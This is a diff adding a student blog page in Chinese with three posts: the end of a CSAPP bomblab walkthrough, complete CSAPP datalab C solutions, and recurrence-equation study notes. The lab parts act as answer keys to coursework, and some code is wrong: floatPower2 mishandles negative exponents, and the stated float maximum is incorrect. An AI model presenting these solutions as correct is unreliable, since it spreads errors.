+		if (q >= x) return 0;
+		return 2 * func4(x, q + 1, z) + 1;
+	} else {
+		return 2 * func4(x, y, q - 1);
+	}
+}
+```
+
+phase_4的部分关键在这些地方
+```asm
+  40102e:	83 7c 24 08 0e       	cmpl   $0xe,0x8(%rsp);if *tx<14 bomb
+  401033:	76 05                	jbe    40103a <phase_4+0x2e>
+  401035:	e8 00 04 00 00       	callq  40143a <explode_bomb>
+  40103a:	ba 0e 00 00 00       	mov    $0xe,%edx;z=14
+  40103f:	be 00 00 00 00       	mov    $0x0,%esi;y=0
+  401044:	8b 7c 24 08          	mov    0x8(%rsp),%edi;x=*tx
+  401048:	e8 81 ff ff ff       	callq  400fce <func4>
+  40104d:	85 c0                	test   %eax,%eax;if func4(tx,0,14)!=0 bomb
+  40104f:	75 07                	jne    401058 <phase_4+0x4c>
+```
+
+## Phase_5
+---
+一开始被%fs这个寄存器吓到了,往后看书才知道这个就是所谓的canary机制,在这里可以不用管~
+剩下的就不是太难。这个函数主要实现了通过一个循环来获取一个常字符串的某些位置得到一个新的串，并将这个串和串"flyers"进行比较
+关键是这个循环部分，看懂就非常简单
+
+```
+  401089:	eb 47                	jmp    4010d2 <phase_5+0x70>
+  40108b:	0f b6 0c 03          	movzbl (%rbx,%rax,1),%ecx;此时rax为0,rbx为str,故rcx=*str
+  40108f:	88 0c 24             	mov    %cl,(%rsp);mem[rsp]=str[0]
+  401092:	48 8b 14 24          	mov    (%rsp),%rdx;rdx=str[0]
+  401096:	83 e2 0f             	and    $0xf,%edx;rdx&=15,此时rdx<=15
+  401099:	0f b6 92 b0 24 40 00 	movzbl 0x4024b0(%rdx),%edx;
+  4010a0:	88 54 04 10          	mov    %dl,0x10(%rsp,%rax,1)
+                                       ;mem[rsp+0x10+rax]=mem[0x4024b0+rdx]
+  4010a4:	48 83 c0 01          	add    $0x1,%rax;rax+=1
+  4010a8:	48 83 f8 06          	cmp    $0x6,%rax;
+  4010ac:	75 dd                	jne    40108b <phase_5+0x29>;while
+```
+
+## Phase_6
+---
+最后一题有点难度
+
+首先可以把代码分成四块。
+第一部分程序读入了6个数字，并检查它们是否全都不一样(否则就炸)且都在1到6之间
+第二部分程序把每个a[i]都变成7-a[i]
+第三部分实现了令c[i]=b[a[i]],其中b是一个常量数组,c是一个结果
+第四部分实现了判断c是否递减,否则就炸
+
+1、2都很简单，4在搞清楚3之后也很简单
+
+```
+  ;begin loop;
+    401176:	48 8b 52 08          	mov    0x8(%rdx),%rdx
+    40117a:	83 c0 01             	add    $0x1,%eax
+    40117d:	39 c8                	cmp    %ecx,%eax
+  40117f:	75 f5                	jne    401176 <phase_6+0x82>
+  ;end loop
+```
+观察这段代码，%ecx储存了a[i]，它实际上实现了找到b中的第a[i]个数，并取出它的位置储存在%rdx中的功能
+其中
+```
+  4011a4:	ba d0 32 60 00       	mov    $0x6032d0,%edx
+```
+给出了b数组的起始位置，那么我们在gdb中扫就可以了，出来的结果是这样的
+![](https://img2020.cnblogs.com/blog/1010529/202101/1010529-20210127225348253-1280795220.png)
+
+第一列就是b中的值
+
+这时候再看第四部分，可以发现这是在遍历c中的6个数字观察它们是否按照一定顺序(降序)排好了
+现在就很好猜了，第三部分首先用a[i]找到第a[i]个b中的元素，再把它存储到c[i]中。中间有点绕是因为程序对第一个元素做了特殊处理，编译器对默认情况的优化有点诡异...
+所以对着图里的数字排序就好了，这样就做完了Phase_6
+
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2021/01/24/CSAPP%E5%AE%9E%E9%AA%8C2-bomblab/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/14/CSAPP%E5%AE%9E%E9%AA%8C1-datalab/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="jpwang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="jjppp">
+      <meta itemprop="description" content="Young, Simple & Naive">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | jjppp">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/01/14/CSAPP%E5%AE%9E%E9%AA%8C1-datalab/" class="post-title-link" itemprop="url">CSAPP实验1 : datalab</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-01-14 18:13:00" itemprop="dateCreated datePublished" datetime="2021-01-14T18:13:00+08:00">2021-01-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-06-19 09:47:11" itemprop="dateModified" datetime="2022-06-19T09:47:11+08:00">2022-06-19</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          考试周除了学习什么都好玩，偶然发现了B站上的“精翻”视频，就冲了
+第一章的视频还没看完(太长了quq),这里也只是写了整形的lab,写了大概有一整天
+明天烤完高代就滚回来填这个lab、课程笔记、导论4、集合论习题的坑...好像有点多,不管了
+
+这些只在本地btest过,不保证能对...如果有错或者有更好的做法欢迎指正!
+
+upd:做完了，爽耶
+![](https://img2020.cnblogs.com/blog/1010529/202101/1010529-20210119235336374-403161748.png)
+
+
+
+## tricks
+---
+1. $[a=b]\iff [(a \otimes b)=0]\iff [(a-b)=0]$
+这个视能否使用"-"和"^"来选择,相当于不用if做出了判断是否相等
+
+2. $(111\dots 11)_2=(-1)_{10}$ 这个...没啥好说的
+
+3. $f(flag,x)=\left\{  {\begin{aligned}0,flag=0\\x,flag=1\end{aligned} }\right.\iff x\&(-flag)$,结合2就可以理解,结合4很有用
+
+4. $(-x)=( (\sim x) + 1)$,这个实际上就是电路中减法的做法,这里可以看出反码在简化运算中的作用
+
+## bitXor
+---
+根据集合论/数理逻辑的知识可以很快想到异或的"对称差"定义
+```c
+//1
+/* 
+ * bitXor - x^y using only ~ and & 
+ *   Example: bitXor(4, 5) = 1
+ *   Legal ops: ~ &
+ *   Max ops: 14
+ *   Rating: 1
+ */
+int bitXor(int x, int y) {
+  int fx = ~x, fy = ~y;
+  int tx = fx & y, ty = fy & x;
+  return ~((~tx) & (~ty));
+}
+```
+
+## tmin
+---
+这里的最小指的是补码对应数值最小...这个直接符号位填1就好了
+
+```c
+/* 
+ * tmin - return minimum two's complement integer 
+ *   Legal ops: ! ~ & ^ | + << >>
+ *   Max ops: 4
+ *   Rating: 1
+ */
+int tmin(void) {
+  return (1 << 31);
+}
+```
+
+## isTmax
+---
+tmax的特点是除了符号位都是1,那么加上1就得到了tmin,取反仍然是tmax
+但是除了tmax还有别的数有这个性质:-1，排除掉就好了
+
+```c
+//2
+/*
+ * isTmax - returns 1 if x is the maximum, two's complement number,
+ *     and 0 otherwise 
+ *   Legal ops: ! ~ & ^ | +
+ *   Max ops: 10
+ *   Rating: 1
+ */
+int isTmax(int x) {
+  int t = x + 1;
+  return !( ( (~t) ^ x) | (!t));
+}
+```
+
+## allOddBits
+---
+lab有要求不能使用超过255的常量,那么一个想法就是把32bits分成4*8bits,
+我们造一个(10101010)来复制4份就可以到奇数位全为1的二进制数，然后就很简单了
+
+```c
+/* 
+ * allOddBits - return 1 if all odd-numbered bits in word set to 1
+ *   where bits are numbered from 0 (least significant) to 31 (most significant)
+ *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1
+ *   Legal ops: ! ~ & ^ | + << >>
+ *   Max ops: 12
+ *   Rating: 2
+ */
+int allOddBits(int x) {
+  int t = 170 | (170 << 8);
+  t = t | (t << 16);
+  return !((t & x) ^ t);
+}
+```
+
+## negate
+---
+看trick4
+
+```c
+/* 
+ * negate - return -x 
+ *   Example: negate(1) = -1.
+ *   Legal ops: ! ~ & ^ | + << >>
+ *   Max ops: 5
+ *   Rating: 2
+ */
+int negate(int x) {
+  return (~x) + 1;
+}
+```
+
+## isAsciiDigit
+---
+这道题就比较灵性...
+观察一下asciiDigit的特点,最后6位都形如$(11xxxx)_2$,而最后4位恰好是$(0000)_2\sim (1001)_2$
+
+我最早的做法是把后6位抠出来,用倒数第4位判掉0~8的情况,再判掉最后2位的情况
+
+事实上做了后面的isLessOrEqual就可以发现这里的另一种做法了...不是很懂这个顺序啊
+
+```c
+//3
+/* 
+ * isAsciiDigit - return 1 if 0x30 <= x <= 0x39 (ASCII codes for characters '0' to '9')
+ *   Example: isAsciiDigit(0x35) = 1.
+ *            isAsciiDigit(0x3a) = 0.
+ *            isAsciiDigit(0x05) = 0.
+ *   Legal ops: ! ~ & ^ | + << >>
+ *   Max ops: 15
+ *   Rating: 3
+ */
+int isAsciiDigit(int x) {
+  int A = !( (x >> 4) ^ 3);
+  int B = !(x & 8);
+  int C = !(x & 6);
+  return A & ( B | C );
+}
+```
+
+## conditional
+---
+利用trick3就可以做了，构造$f(flag,x)\otimes f(!flag,y)$就好了
+
+我在写到这里的时候没有意识到trick4可以用,所以写的比较繁琐
+
+```c
+/* 
+ * conditional - same as x ? y : z 
+ *   Example: conditional(2,4,5) = 4
+ *   Legal ops: ! ~ & ^ | + << >>
+ *   Max ops: 16
+ *   Rating: 3
+ */
+int conditional(int x, int y, int z) {
+  int px1 = !x;
+  int px2 = !px1;
+  int ty = ( (px2 << 31) >> 31 ) & y;
+  int tz = ( (px1 << 31) >> 31 ) & z;
+  return ty ^ tz;
+}
+```
+
+## isLessOrEqualTo
+---
+最直观就是做差,判断$\triangle$的符号位
+然而当两个数异号的时候,他们的差会溢出,为了处理这种状况我们要先判掉异号的情况,这样同号运算就是在范围内的了
+
+```c
+/* 
+ * isLessOrEqual - if x <= y  then return 1, else return 0 
+ *   Example: isLessOrEqual(4,5) = 1.
+ *   Legal ops: ! ~ & ^ | + << >>
+ *   Max ops: 24
+ *   Rating: 3
+ */
+int isLessOrEqual(int x, int y) {
+  int d = x + (1 + (~y) );
+  int fx = (x >> 31) & 1;
+  int fy = (y >> 31) & 1;
+  return ( (!d) | ( (d >> 31) & 1) | ( fx & (!fy) ) ) & !( (!fx) & fy);
+}
+```
+
+## logicalNeg
+---
+
+可以发现符号位不重要,第一步先去掉符号位得到"绝对值"
+
+如果是0的话取反就会得到-1，否则都得不到-1
+
+此时加1又可以得到0,即符号位为正,而其余情况得到的都是负数
+
+这个性质可以判掉"大部分"非0数字,特例是-2147483648,它没有绝对值(或者说,"绝对值"是0)...所以特判一下就好了
+
+```c
+//4
+/* 
+ * logicalNeg - implement the ! operator, using all of 
+ *              the legal operators except !
+ *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1
+ *   Legal ops: ~ & ^ | + << >>
+ *   Max ops: 12
+ *   Rating: 4 
+ */
+int logicalNeg(int x) {
+  int tx = (~x) | (1 << 31);
+  return ( ~( ( ( tx + 1 ) | x ) >> 31 ) ) & 1;
+}
+```
+
+## howManyBits
+---
+
+先考虑正数,我们要找的就是最高位的1在哪(第几位)
+
+负数的情况比较特殊,因为从符号位开始连续的1序列和单独的一个符号位1等价(回忆课堂上的Sign Extension),那么我们只需要保留一个符号位,也就是只需要找到最高位的0就可以了
+
+于是负数就取反,找最高位的1可以用二分(魔幻吧),想了好久才想到...
+
+先判断前16位是否有1,然后通过右移来调整下一次判断的区间,以此类推...就可以了
+
+
+
+```c
+/* howManyBits - return the minimum number of bits required to represent x in
+ *             two's complement
+ *  Examples: howManyBits(12) = 5
+ *            howManyBits(298) = 10
+ *            howManyBits(-5) = 4
+ *            howManyBits(0)  = 1
+ *            howManyBits(-1) = 1
+ *            howManyBits(0x80000000) = 32
+ *  Legal ops: ! ~ & ^ | + << >>
+ *  Max ops: 90
+ *  Rating: 4
+ */
+int howManyBits(int x) {
+  int t1, L1, t2, L2, t3, L3, t4, L4, t5, L5;
+  int s = ~1 + 1, rx = x, cx = !x;
+  int p = (x >> 31) & 1, dx = !(rx ^ s);
+  x ^= ~p + 1;
+  t1 = s & (x >> 16); L1 = ( (!!t1) << 4); x >>= L1;
+  t2 = s & (x >> 8);  L2 = ( (!!t2) << 3); x >>= L2;
+  t3 = (x >> 4) & s;  L3 = ( (!!t3) << 2); x >>= L3;
+  t4 = (x >> 2) & s;  L4 = ( (!!t4) << 1); x >>= L4;
+  t5 = (x >> 1) & s;  L5 = (!!t5); x >>= L5;
+  return L1 + L2 + L3 + L4 + L5 + 2 + (1 + ~cx ) + (1 + ~dx);
+}
+```
+
+## floatScale2
+---
+
+浮点数的编码很有意思
+
+分类讨论。首先判掉NaN和INF,对于denorm的形式我们只要左移frac部分,对于norm形式我们只需要增加指数exp(why?)
+
+这个例子大概是给你熟悉浮点数编码分类的
+
+```c
+//float
+/* 
+ * floatScale2 - Return bit-level equivalent of expression 2*f for
+ *   floating point argument f.
+ *   Both the argument and result are passed as unsigned int's, but
+ *   they are to be interpreted as the bit-level representation of
+ *   single-precision floating point values.
+ *   When argument is NaN, return argument
+ *   Legal ops: Any integer/unsigned operations incl. ||, &&. also if, while
+ *   Max ops: 30
+ *   Rating: 4
+ */
+unsigned floatScale2(unsigned uf) {
+  unsigned s = (uf >> 31) & 1;
+  unsigned e = (uf >> 23) & 255;
+  unsigned m = uf & 8388607;
+  if (e == 0) {
+    m = m * 2;
+  } else if (e != 255) {
+    e = e + 1;
+  }
+  return (s << 31) | (e << 23) | m;
+}
+```
+
+## floatFloat2Int
+---
+
+试了一下,C里面的强制类型转换会截掉小数点后的部分,除非某种类似`1.9999999999999999999`的例子,在这个例子下类型转换会变成2(why?)
+
+事实上第二种情况我们不需要考虑,因此只需要把frac部分抠出来,前面添上1,按照exp-bias得到的指数位e偏移即可。很显然如果它是一个denorm/指数为负的norm的话答案就是0
+
+```c
+/* 
+ * floatFloat2Int - Return bit-level equivalent of expression (int) f
+ *   for floating point argument f.
+ *   Argument is passed as unsigned int, but
+ *   it is to be interpreted as the bit-level representation of a
+ *   single-precision floating point value.
+ *   Anything out of range (including NaN and infinity) should return
+ *   0x80000000u.
+ *   Legal ops: Any integer/unsigned operations incl. ||, &&. also if, while
+ *   Max ops: 30
+ *   Rating: 4
+ */
+int floatFloat2Int(unsigned uf) {
+  int s = (uf >> 31) & 1;
+  int e = (uf >> 23) & 255;
+  int m = uf & 8388607;
+  int bias = 127, i = 22, r = 1;
+  if (e == 255) {
+    return 0x80000000u;
+  } else if (e == 0) {
+    return 0;
+  } else {
+    e -= bias;
+    if (e < 0) return 0;
+    for (; i >= 0; i --) {
+      if ( (m >> i) & 1) break;
+    }
+    while (e > 0) {
+      e -= 1; i -= 1; r <<= 1;
+      if (i > 0) r |= ( (m >> i) & 1);
+      if (r < 0) return 0x80000000u;
+    }
+    return s?(-r):r;
+  }
+}
+```
+
+## floatPower2
+---
+
+这个也挺简单的...
+
+从这个题可以看出单精度(32位)浮点数能表示的数字的范围
+
+**最大值**是norm形式,exp为254(再大就是NaN和INF了),frac的每一位全为1(虽然在这题里不是这样),就能得到${\left(2-\epsilon\right)}^{127}$
+
+**最小值**是denorm形式,exp为0,frac为1,此时指数e是1-127,尾数额外提供了23位的指数,这样就得到$2^{-149}$
+
+这样直接做就可以了
+
+```c
+/* 
+ * floatPower2 - Return bit-level equivalent of the expression 2.0^x
+ *   (2.0 raised to the power x) for any 32-bit integer x.
+ *
+ *   The unsigned value that is returned should have the identical bit
+ *   representation as the single-precision floating-point number 2.0^x.
+ *   If the result is too small to be represented as a denorm, return
+ *   0. If too large, return +INF.
+ * 
+ *   Legal ops: Any integer/unsigned operations incl. ||, &&. Also if, while 
+ *   Max ops: 30 
+ *   Rating: 4
+ */
+unsigned floatPower2(int x) {
+  int s = 0, m = 0, e = 127;
+  if (x < 0) {
+    if (-x > 149) return 0;
+    else if (-x <= 126) {
+      e = 1;
+    } else {
+      e = 0;
+      m = (0x400000u) >> (-x - 126);
+    }
+  } else if (x > 0) {
+    if (x + 127 > 255) return 0x7f800000;
+    else e = x + 127;
+  }
+  return (s << 31) | (e << 23) | m;
+}
+```
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2021/01/14/CSAPP%E5%AE%9E%E9%AA%8C1-datalab/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/06/%E4%BF%A1%E6%81%AF%E4%B8%8E%E8%AE%A1%E7%AE%97%E7%A7%91%E5%AD%A6%E5%AF%BC%E8%AE%BA%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="jpwang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="jjppp">
+      <meta itemprop="description" content="Young, Simple & Naive">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | jjppp">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/01/06/%E4%BF%A1%E6%81%AF%E4%B8%8E%E8%AE%A1%E7%AE%97%E7%A7%91%E5%AD%A6%E5%AF%BC%E8%AE%BA%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/" class="post-title-link" itemprop="url">信息与计算科学导论复习笔记三</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-01-06 22:48:00" itemprop="dateCreated datePublished" datetime="2021-01-06T22:48:00+08:00">2021-01-06</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-06-19 09:47:11" itemprop="dateModified" datetime="2022-06-19T09:47:11+08:00">2022-06-19</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          这里的递归实际上也可以理解为递推
+##Karatsuba算法
+计算界次为$n$的多项式乘积，$naive$做法需要计算$n^2$次
+一个本科生(！！！)提出了这样的算法。考虑计算$\left(ax+b\right)\left(cx+d\right)$
+展开就是$acx^2+\left(ad+bc\right)x+bd$，其中$ac$和$bd$无法避免，而$\left(ad+bc\right)=\left(a+b\right)\left(c+d\right)-ac-bd$，这样我们只需要计算$\left(ad+bc\right)$、$ac$和$bd$就可以了，这样就减少了$\frac{1}{4}$的乘法次数
+
+再套入递归中，可以得到这样一个乘法次数的计算公式$T\left(n\right)=3T\left(\lfloor\frac{n}{2}\rfloor\right)$，注意这个不是时间复杂度，不然还要加上后面加法的n次循环(这样做只是为了方便引入递归方程的概念)
+
+考虑怎么解这个东西。只需要不停地拆开就可以得到$T\left(n\right)=3^{\log_{2}{n} }\times T_0$，其中$T_0$是一个与n无关的常数，所以我们可以认为$T\left(n\right)=3^{\log_{2}{n} }=n^{\log_2{3} }$，等号的由来可以两边取对数
+
+这种形式的的方程被称为递归方程(recurrence equation)，通常这类问题没有一般做法，最好的做法是guess and prove……
+
+##解的结构
+这里讨论形如$T\left(n\right)=f\left(n\right)+\sum\limits_{i=1}^{k}{a_i T\left(n-i\right)}$的方程的解的结构，当然括号内部还可以更复杂，这里只是一个简单的情形
+
+类比线性代数，递归方程也有所谓的常系数线性齐次递归方程($f\left(n\right)=0$的时候)。方程的解同样可以表示为若干通解和特解的和的集合
+
+通解：指令$f\left(n\right)=0$，得到的递归方程的**所有**解
+特解：指带入原方程后满足递归方程的一个解
+
+怎么证明呢？不妨设$T_0\left(n\right)$是一个通解，$T_1\left(n\right)$是一个特解
+则$T_0\left(n\right)+T_1\left(n\right)=f\left(n\right)+\sum\limits_{i=1}^{k}{a_i\left({T_0\left(n-i\right)+T_1\left(n-i\right)}\right)}$
+也满足这个递归方程，因此我们说$T_0\left(n\right)+T_1\left(n\right)$也是原方程的一个解。类似地我们可以得到特解加上任意一个通解都是原方程的解
+
+反过来也是一样的，只需要做差就行了
+
+##特征方程求解
+对于常系数线性齐次递推，我们(教材)猜测解的形式可以是等比数列(guess)
+
+带入看看就是$V\cdot p^n=V\sum\limits_{i=1}^{k}{a_i\cdot p^{n-i} }$，这里$V$是任意常数
+这是一个一元$k$次方程，也是它的特征方程，特征方程的根带入都满足常系数线性齐次幂递归方程。为了简便讨论这里假设没有重根
+
+由解的结构我们知道，这k个通解加起来得到的仍然是原方程的解，并且每一项的系数$V$是不一样的
+
+怎么证明这是唯一的解呢？假设存在另一个解$S\left(n\right)$，则可以列出线性方程组。这个方程组的系数矩阵是范德蒙矩阵，于是就完了。
+
+对于有重根的情况，解可以写成$\sum\limits_{i=1}^{k-L}\left({a_i\cdot\sum\limits_{j=1}^{L_i}{\left({n^{j-1}\cdot x_i}\right)} }\right)$
+其中$L$是不同根的数量，Li是重数
+
+证明：考虑多项式$F\left(x\right)=x^n-\sum\limits_{i=1}^k{a_i\cdot x^i}$
+若$x_1$是多项式的二重根，则它是$F'\left(x\right)$的单根，即$F'\left(x\right)=nx^{n-1}-\sum\limits_{i=1}^k{a_i\cdot i\cdot x^{i-1} }$
+两边同事乘上x得到$xF'\left(x\right)=nx^n-\sum\limits_{i=1}^k{a_i\cdot i\cdot x^i}$，带入$x=x_1$恰好等于0
+也就是说，$n\cdot {x_1}^n$也是这个递归方程的解，解就可以写成类似$\left(1+n\right){x_1}^n$这种形式了
+
+多重根也是类似的，这里就不推了(懒)
+这种方法的难点一般在找一个特解和解特征方程。找特解需要一点智慧，而高次方程通常都很不好解……
+
+##生成函数
+这是我最喜欢的方法;-P
+
+考虑这样一个函数$F(x)=\sum\limits_{i=0}^{\infty}{T\left(i\right)x^i}$，它包含了一个数列的所有信息，并且可以作为一个整体处理
+这样的东西就是生成函数(Generating Function)，也被称为母函数/形式幂级数。在这里我们不关心它是否收敛，而只在乎它的系数，x只是一个占位符号
+
+以斐波那契数列为例子，$F_n=F_{n-1}+F_{n-2}$且$F_0=F_1=1$就可以写成$G(x)=xG(x)+x^2G(x)+1$
+化简就得到$G(x)=\frac{1}{1-x-x^2}$
+
+看起来很炫酷，但是你这一顿操作也没有得到数列公式啊？
+首先考虑一个等比数列$T(n)=p^n$，则很容易写出这个数列的生成函数$H(x)=\sum\limits_{i=0}^{\infty}{\left(px\right)^{i} }$
+既然是等比数列，那么就可以写成$H(x)=\frac{1}{1-px}$，之所以略去了一项是因为我们可以令x任意取值使得这一项是无穷小
+
+这提示我们可以把$G(x)$拆成等比数列之和，于是这个就很简单了
+
+如果不能裂项怎么办？再考虑$P(x)=\frac{1}{\left(1-px\right)^k}$
+观察第l项的系数，这里是k个等比数列相乘，这k个项的未知数上指数之和为l，p的指数之和也为l，这里用隔板法就可以做了，系数就是$\binom{l+k-1}{k-1}\cdot p^l$
+
+这里得出的结论和上面的方法是一致的，也就是我们总能得到若干个等比数列的线性组合，它满足递归方程
+
+有一点非常重要的是，在使用生成函数方法时，要小心处理前k项的值，如果是未知的最好设出来，不然会有漏解的情况。不过有的时候用这种方法求一个特解也是极好的，结合上面的方法就很好啦~
+还有一些生成函数的运算法则，这个只需要知道两个生成函数相乘得到的是卷积就可以了，剩下的都比较简单
+
+##算子
+这个听得比较懵逼，但是dl说它足够抽象，可以带来新的视角(囧)，先随便写写回来填坑
+算子可以理解为是一个对数列的操作，即$opt(T(n))$得到得还是一个数列。我们把能使一个数列变成0的算子称为消去子(annihilator)
+
+一个想法是，如果我们找到了把$T(n)$消成0的算子g，和g能消去的所有数列的集合$P$，那么我们就可以认为是找到了所有的解(饶舌)
+这个想法看上去不那么直观，甚至有点刻意的味道……
+
+课件给出了两个最基本的算子$L$和$c$，分别表示把数列左移一位、每一项乘上常数c
+习题中出现的两种算子$\triangle$和$\sum$分别表示差分和求和(可以理解为求导和积分)，类似的甚至有分步积分的形式
+
+法则：
+1. 基础的两种消去子满足交换律、结合律(显然)
+2. 假如算子A消去了F，B消去了G，则AB能消去F+G
+
+这里证明一下法则2：$AB(F+G)=ABF+ABG=B(AF)+A(BG)=0$
+
+例子：解递归方程$T(n)=2T(\sqrt{n})+\log n$
+注意到我们知道的递归方程解法都只和加减法有关，于是考虑变形。令$n=2^k$,则有$T(2^k)=2T(2^{\frac{k}{2} })+k$
+记$t(k)=T(2^k)$，则有$t(k)=2t(\frac{k}{2})+k$，故技重施再令$k=2^u$，则$t(2^u)=2t(2^{u-1})+2^u$
+于是$t'(u)=2t'(u-1)+2^u$
+
+先去掉$2^u$的项观察齐次的部分$t'(u)=2t'(u-1)$，这个东西的消去子是$(L-2)$
+把这个算子施加在数列上可以得到$(L-2)t'(u)=Lt'(u)-2t'(u)=t'(u+1)-2t'(u)=2^{u+1}$，这一步还是很好理解的
+那么我们就得到了一个新的数列$(L-2)t'(u)=2^{u+1}$，这个东西的消去子又是$(L-2)$，于是$(L-2)^2t'(u)=0$
+
+这个消去子能消去哪些数列呢？类比消去子和特征方程，不难发现这个东西能消去形如$(c_1+c_2n)\cdot 2^n$的数列
+因此有$t'(u)=(c_1+c_2u)\cdot 2^u$，即$t(k)=(c_1+c_2\cdot\log k)\cdot k$
+因此有$T(n)=\log n\cdot(c_1+c_2\cdot \log\log n)$
+
+
+##渐进解
+很多时候(大部分时候)我们是不能得出递归方程的精确解的，通常我们只能得到一个渐进意义下的解(但这不意味着我们不关心确解，当然越精确越好~)
+
+渐进意义下(asymptotically)有点类似数学分析里的等价无穷大/等价无穷小
+我们称函数$f(x)$的增长速度在渐进意义下不超过$g(x)$，代表$\exists N,M>0$，当$n>N$时，恒有$f(x)\le M\cdot g(x)$成立，即$\lim\limits_{n\rightarrow \infty}{\frac{f(x)}{g(x)} }< M$，其中$M$ 是个常数。
+
+如果这里的$M$是0，我们认为$f(x)$也是不超过$g(x)$的。
+
+上述两种情况记作$f(x)=O(g(x))$，这实际上是一个不等号，包含了渐进意义下等价和小于两种情况(M是否为0)
+
+
+
+需要注意的是，这里我们研究的函数可以认为都是非负的、定义域在正整数上的函数。因为这里的分析来源于算法的复杂度分析，倘若一个算法的复杂度和输入规模无关(或者说消耗时间为负数，它越跑越快~~雾~~)，那么我们就没有什么必要研究这个算法了……
+
+同时还有如下定义：
+1. $f(x)=\Theta(g(x))\iff f(x)=O(g(x))$且$g(x)=O(f(x))$，这样就排除了$M=0$的情况
+2. $f(x)=o(g(x))\iff g(x)=O(f(x))$
+
+不难发现，这三种符号对应了不同的二元关系(联系2、3章)，所有的多项式(这里所说的多项式指数可以是实数，甚至可以带log等函数)都可以由一个最简单的形式代表
+
+还有一个很有意思的结论：$\sum\limits_{i=1}^{k}{f_i(n)}\le\sum\limits_{i=1}^{k}{f_{max}(n)}=k\cdot f_{max}(n)=\Theta(f_{max}(n))$，这里$k$是和n无关的常数。这个结论写出来就证明完了
+
+##Master Theorem
+这个太强了！之前看的一直是简略版本，这里是一个更加详尽的版本
+
+考虑形如$T\left(n\right)=aT\left(\lfloor\frac{n}{b}\rfloor\right)+f(n)$的递归方程
+分三种情况：
+1. 若$f(n)=\Theta\left(n^c\right)$，且$c<\log_ba$，那么$T\left(n\right)=\Theta\left(n^{\log_ba}\right)$
+2. 若$f(n)=\Theta\left(n^c\right)$，且$c>\log_ba$，且$f(n)$满足正则条件(regular condition)，那么$T\left(n\right)=\Theta\left(n^c\right)$
+3. 若$f(n)=\Theta\left(n^{\log_ba}\log^k n\right)$，且$k> -1$，则$T\left(n\right)=\Theta\left(n^{\log_ba}\log^{k+1}n\right)$
+
+正则条件指的是对于函数$f(n)$，$\exists d< 1$，当n充分大时，满足$a\cdot f\left(\frac{n}{b}\right)< d\cdot f\left(n\right)$
+注意到这里给出的都是$\Theta$，这可比网上一搜一大堆的$O$强多了
+
+一个通俗的理解是，考虑等号右边两项哪个更大，则主要的复杂度取决于哪个。如果要证明可以把递归拆开然后用等比数列求和的公式，讨论公比就可以得到这个结论了。实在不行归纳也可以证明
+
+有的时候不能用注定理，比如说$f(n)=n^{1-\frac{1}{n} }$，这里不存在任何一个$c=1-\frac{1}{n}$
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2021/01/06/%E4%BF%A1%E6%81%AF%E4%B8%8E%E8%AE%A1%E7%AE%97%E7%A7%91%E5%AD%A6%E5%AF%BC%E8%AE%BA%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
